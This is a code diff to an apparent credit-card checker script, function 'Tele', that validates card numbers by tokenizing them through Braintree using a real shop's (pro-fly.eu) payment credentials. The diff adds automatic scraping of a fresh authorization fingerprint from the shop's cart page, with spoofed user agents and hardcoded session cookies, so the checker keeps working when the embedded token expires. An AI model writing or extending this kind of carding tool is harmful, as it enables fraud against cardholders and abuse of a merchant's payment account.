@@ -1,4 +1,6 @@
 import requests,re
+import user_agent
+import base64
 def Tele(ccx):
 	import requests
 	ccx=ccx.strip()
@@ -10,11 +12,13 @@ def Tele(ccx):
 		yy = yy.split("20")[1]
 	r = requests.session()
 	import requests
+	with open("data.txt", "r") as file:
+		first_line = file.readline().strip()
 	headers = {
 	    'authority': 'payments.braintree-api.com',
 	    'accept': '*/*',
 	    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7,ar-AE;q=0.6',
-	    'authorization': 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE3MDM1MjIxOTEsImp0aSI6ImE0MGY5M2U0LTNkZTktNGViOS1hODQyLWJhZDdiOGIwYWE0NSIsInN1YiI6IjJ4NTR0Z2h4ODM2NjluMzYiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6IjJ4NTR0Z2h4ODM2NjluMzYiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0IjpmYWxzZX0sInJpZ2h0cyI6WyJtYW5hZ2VfdmF1bHQiXSwic2NvcGUiOlsiQnJhaW50cmVlOlZhdWx0Il0sIm9wdGlvbnMiOnt9fQ.DLKkU4kehqreGb5X7cVLn70Qm1n5qHX8G9eSeAEkdgOmkEgMpEf3oudnmQ9LPhASVWHCrb4UwpzreepR3Xipig',
+	    'authorization': f'Bearer {first_line}',
 	    'braintree-version': '2018-05-10',
 	    'content-type': 'application/json',
 	    'origin': 'https://assets.braintreegateway.com',
@@ -52,9 +56,44 @@ def Tele(ccx):
 	}
 	
 	response = requests.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)
-	token=(response.json()['data']['tokenizeCreditCard']['token'])
-	import requests
-	
+	try:
+		token=(response.json()['data']['tokenizeCreditCard']['token'])
+	except:
+		cookies = {
+		    '_ga': 'GA1.1.2114504824.1703464596',
+		    'cookie_consent': 'True',
+		    'shopping_cart': 'eyJwayI6NzA4MiwicXVhbnRpdHkiOjEsIm9yZGVyIjpudWxsfQ:1rHYxi:NV48jqJ3023HOLcH6xYbi6WRTgI',
+		    'csrftoken': 'MdVCvLEFjDFNkZWPbsA2AHp3cD3JBmyOgmEOt5O0656SBMQmdjG3o9XJ7PCTBrSZ',
+		    '_ga_CJN3B8R3NX': 'GS1.1.1703464595.1.1.1703464691.0.0.0',
+		}
+		
+		headers = {
+		    'authority': 'www.pro-fly.eu',
+		    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+		    'accept-language': 'en-US,en;q=0.9',
+		    'cache-control': 'max-age=0',
+		    # 'cookie': '_ga=GA1.1.2114504824.1703464596; cookie_consent=True; shopping_cart=eyJwayI6NzA4MiwicXVhbnRpdHkiOjEsIm9yZGVyIjpudWxsfQ:1rHYxi:NV48jqJ3023HOLcH6xYbi6WRTgI; csrftoken=MdVCvLEFjDFNkZWPbsA2AHp3cD3JBmyOgmEOt5O0656SBMQmdjG3o9XJ7PCTBrSZ; _ga_CJN3B8R3NX=GS1.1.1703464595.1.1.1703464691.0.0.0',
+		    'referer': 'https://www.pro-fly.eu/cart/payment/',
+		    'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
+		    'sec-ch-ua-mobile': '?1',
+		    'sec-ch-ua-platform': '"Android"',
+		    'sec-fetch-dest': 'document',
+		    'sec-fetch-mode': 'navigate',
+		    'sec-fetch-site': 'same-origin',
+		    'sec-fetch-user': '?1',
+		    'upgrade-insecure-requests': '1',
+		    'user-agent': user_agent.generate_user_agent(),
+		}
+		
+		response = requests.get('https://www.pro-fly.eu/cart/payment/card/', cookies=cookies, headers=headers)
+		
+		no=re.search(r'eyJ2\w+\W\W',response.text)[0]
+		encoded_text = no
+		decoded_text = base64.b64decode(encoded_text).decode('utf-8')
+		au=re.findall(r'"authorizationFingerprint":"(.*?)"',decoded_text)[0]
+		with open("data.txt", "w") as file:
+			file.write(au)
+		return
 	headers = {
 	    'authority': 'api.braintreegateway.com',
 	    'accept': '*/*',
@@ -90,7 +129,7 @@ def Tele(ccx):
 	        'issuerDeviceDataCollectionTimeElapsed': 11311,
 	        'issuerDeviceDataCollectionResult': False,
 	    },
-	    'authorizationFingerprint': 'eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE3MDM1MjIxOTEsImp0aSI6ImE0MGY5M2U0LTNkZTktNGViOS1hODQyLWJhZDdiOGIwYWE0NSIsInN1YiI6IjJ4NTR0Z2h4ODM2NjluMzYiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6IjJ4NTR0Z2h4ODM2NjluMzYiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0IjpmYWxzZX0sInJpZ2h0cyI6WyJtYW5hZ2VfdmF1bHQiXSwic2NvcGUiOlsiQnJhaW50cmVlOlZhdWx0Il0sIm9wdGlvbnMiOnt9fQ.DLKkU4kehqreGb5X7cVLn70Qm1n5qHX8G9eSeAEkdgOmkEgMpEf3oudnmQ9LPhASVWHCrb4UwpzreepR3Xipig',
+	    'authorizationFingerprint': first_line,
 	    'braintreeLibraryVersion': 'braintree/web/3.70.0',
 	    '_meta': {
 	        'merchantAppId': 'www.pro-fly.eu',
